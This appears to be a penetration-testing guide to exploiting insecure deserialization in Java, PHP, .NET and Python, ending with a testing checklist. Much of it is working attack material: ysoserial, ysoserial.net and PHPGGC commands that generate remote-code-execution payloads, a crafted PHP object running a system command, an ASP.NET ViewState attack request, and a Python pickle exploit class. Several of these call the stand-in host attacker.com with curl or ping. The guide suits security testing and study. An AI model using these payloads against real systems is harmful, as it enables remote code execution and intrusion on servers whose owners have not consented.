Deserialization
Insecure deserialization turns user-controlled data into live objects on the server. Unlike SQL injection where you're manipulating strings, here you're instantiating classes, triggering constructors, and executing arbitrary method chains. The impact ceiling is RCE, and the attack surface is wider than most testers realize  -  it shows up in Java, PHP, .NET, Python, Ruby, and anywhere else objects are serialized for transport or storage.

Identifying Serialized Data
Look for these markers in requests, cookies, hidden form fields, and message queues:

Java Deserialization
Java is the most well-studied target. The attack relies on "gadget chains"  -  sequences of existing classes in the application's classpath whose methods chain together to achieve code execution during deserialization.
Step 1: Detect Java Serialization
POST /api/transfer HTTP/1.1
Host: target.com
Content-Type: application/x-java-serialized-object
 
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...
Also check: cookies, X-* headers, multipart form fields, JMX endpoints, RMI services, and any base64-encoded blob that decodes to ac ed 00 05.
Step 2: Generate Payloads with ysoserial
# List available gadget chains
java -jar ysoserial.jar --help
 
# Common chains  -  try each one
java -jar ysoserial.jar CommonsCollections1 'curl attacker.com/pwned' > payload.bin
java -jar ysoserial.jar CommonsCollections5 'ping -c 3 attacker.com' > payload.bin
java -jar ysoserial.jar CommonsBeanutils1 'nslookup test.burpcollaborator.net' > payload.bin
 
# Base64 encode for transport
cat payload.bin | base64 -w0
The gadget chain you need depends on which libraries are on the target's classpath. CommonsCollections variants are the most common, but CommonsBeanutils, Spring, Hibernate, and JBoss chains all exist.
Step 3: Blind Detection via DNS/Sleep
When you can't see output directly, use out-of-band detection:
# DNS callback
java -jar ysoserial.jar URLDNS 'deser-test.burpcollaborator.net' > payload.bin
 
# URLDNS doesn't need a gadget library  -  it uses java.net.URL
# If you get a DNS hit, deserialization is happening
# Then try RCE chains for actual exploitation
URLDNS is the safest detection payload  -  it requires no third-party libraries and triggers a DNS lookup during deserialization. A DNS callback confirms the vulnerability exists before you start brute-forcing gadget chains.
PHP Deserialization
PHP's unserialize() instantiates objects and calls magic methods (__wakeup, __destruct, __toString). If user input reaches unserialize():
// Vulnerable pattern
$data = unserialize($_COOKIE['user_prefs']);
Craft a payload targeting a class with dangerous magic methods:
O:8:"Database":1:{s:3:"cmd";s:17:"system('id > /tmp/pwned')";}
PHP Gadget Chains
Use PHPGGC (PHP Generic Gadget Chains):
# List available chains
phpggc -l
 
# Generate payload for a specific framework
phpggc Laravel/RCE1 system 'id' -b  # base64 output
phpggc Symfony/RCE4 system 'id' -s   # serialized output
phpggc Monolog/RCE1 system 'id'
Look for common PHP frameworks: Laravel, Symfony, WordPress (plugins), Magento, Drupal.
.NET Deserialization
BinaryFormatter
.NET's BinaryFormatter is the Java ObjectInputStream equivalent  -  Microsoft has officially deprecated it as unsafe.
Detection: base64 blob starting with AAEAAAD/////
Common sinks: BinaryFormatter.Deserialize(), SoapFormatter, NetDataContractSerializer
Use ysoserial.net to generate payloads:
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "ping attacker.com" -o base64
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c nslookup test.burpcollaborator.net"
ViewState Deserialization
ASP.NET ViewState is a serialized object stored in a hidden form field. If ViewStateUserKey is not set and the MAC validation key is known or disabled:
POST /account HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
 
__VIEWSTATE=<ysoserial.net_payload>&__VIEWSTATEGENERATOR=CA0B0334
Finding the machine key: check web.config disclosure, Azure misconfigurations, error messages leaking machineKey, or default keys in older frameworks.
Python Pickle
Python's pickle module executes arbitrary code during deserialization by design:
import pickle
import base64
import os
 
class Exploit:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/pwned',))
 
payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload)
Look for pickle data in: Django sessions (if using PickleSerializer), Flask cookies (if using pickle instead of JSON), Redis-cached objects, Celery task arguments, ML model files.

Checklist

 Search all requests for serialized data markers: rO0AB, ac ed, O:, AAEAAAD, pickle bytes
 Check cookies, hidden form fields, and custom headers for serialized objects
 Send URLDNS payload to confirm Java deserialization without needing gadget libraries
 Enumerate classpath libraries (error messages, stack traces, known framework)
 Try ysoserial gadget chains matching the target's libraries
 For PHP: identify framework and use PHPGGC for matching gadget chains
 For .NET: check for ViewState without MAC validation, try ysoserial.net
 For Python: test pickle deserialization in cookies, session stores, and API parameters
 Use blind detection (DNS/sleep) when output is not visible
 Install Freddy and Java Deserialization Scanner in Burp for passive detection
